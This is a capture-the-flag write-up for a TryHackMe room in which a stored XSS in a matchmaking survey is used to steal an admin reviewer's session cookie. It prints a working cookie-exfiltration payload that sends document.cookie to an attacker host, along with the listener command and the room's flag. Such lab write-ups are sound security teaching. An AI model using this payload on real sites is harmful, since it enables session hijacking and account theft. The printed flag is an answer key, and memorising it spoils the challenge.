---
title: "Cupid’s Matchmaker"
section: tryhackme
date: "2026-08-13T15:50:54+05:00"
summary: "Stored XSS in a matchmaking survey steals the reviewer’s session cookie and exposes the flag."
tags: ["tryhackme", "love-at-first-breach", "xss", "cookie-theft", "web-security"]
image: "/assets/images/tryhackme/cupids-matchmaker/banner-cupid-s-matchmaker.png"
---
**Room:** [Love at First Breach 2026 – Cupid's Matchmaker](https://tryhackme.com/room/lafb2026e3)

A stored XSS vulnerability in a "human-powered" matchmaking survey. The site claims a real person reads every submission no AI, no algorithms but that "human review" is exactly what makes it vulnerable: whatever you write in the form gets rendered somewhere on the backend, and if that render isn't sanitized, your script runs in someone else's browser.

![Cupid's Matchmaker banner](/assets/images/tryhackme/cupids-matchmaker/banner-cupid-s-matchmaker.png)

---

## Recon

Let's navigate to the URL and check what we get.

![Homepage](/assets/images/tryhackme/cupids-matchmaker/02-homepage.png)

The site's pitch is "No Algorithms. No AI. Just Real Human Matchmakers" so somewhere behind the scenes, an actual person (or at least an admin panel) is reading whatever gets submitted.

There's a survey option, so let's go there.

![Survey form](/assets/images/tryhackme/cupids-matchmaker/03-survey-form.png)

After submitting it, the survey just says it goes to the developers/matchmaking team and nothing else happens on the frontend.

Let's try gobuster on it:

```
gobuster dir -u http://10.112.129.122:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Gobuster scan](/assets/images/tryhackme/cupids-matchmaker/04-gobuster-scan.png)

Interesting we find an admin page. Let's go there and check it out.

![Admin login page](/assets/images/tryhackme/cupids-matchmaker/05-admin-login-page.png)

I tried a bunch of tricks and payloads on the login form, but nothing worked there. So I went back to the survey form instead since it said the submission goes to the developers/team for review, maybe there's something to get from that side of things.

I tried an XSS payload in the survey and it gave me a green success signal.

![Survey submitted successfully](/assets/images/tryhackme/cupids-matchmaker/06-xss-success-banner.png)

---

## Exploiting the XSS

Now let's work on it properly. The idea is to steal the session cookie of whoever (the "matchmaking team" / admin) opens and reviews the submission. I wasn't sure exactly which field on the form actually gets rendered unsanitized on the review side, so I dropped the payload into every field just to be safe.

Payload used:

```html
<img src=x onerror="new Image().src='http://192.168.134.30:5000/?cookie='+encodeURIComponent(document.cookie)">
```

![XSS payload filled into every survey field](/assets/images/tryhackme/cupids-matchmaker/07-xss-payload-in-survey.png)

On the other end, I set up a listener on port 5000:

```
python3 -m http.server 5000
```

Once the admin/reviewer opened the submission, the payload fired and the cookie came in as a URL-encoded GET request since the payload uses `encodeURIComponent`.

![Listener catching the cookie](/assets/images/tryhackme/cupids-matchmaker/08-listener-captures-cookie.png)

The captured request looked like:

```
GET /?cookie=flag%3DTHM%7BXSS_CuP1d_Str1k3s_Ag41n%7D HTTP/1.1
```

I then took that URL-encoded string and decoded it using CyberChef (URL Decode recipe), which revealed the flag directly.

![Decoding the cookie in CyberChef](/assets/images/tryhackme/cupids-matchmaker/09-cyberchef-decoded-flag.png)

---

## Flag

```
THM{XSS_CuP1d_Str1k3s_Ag41n}
```
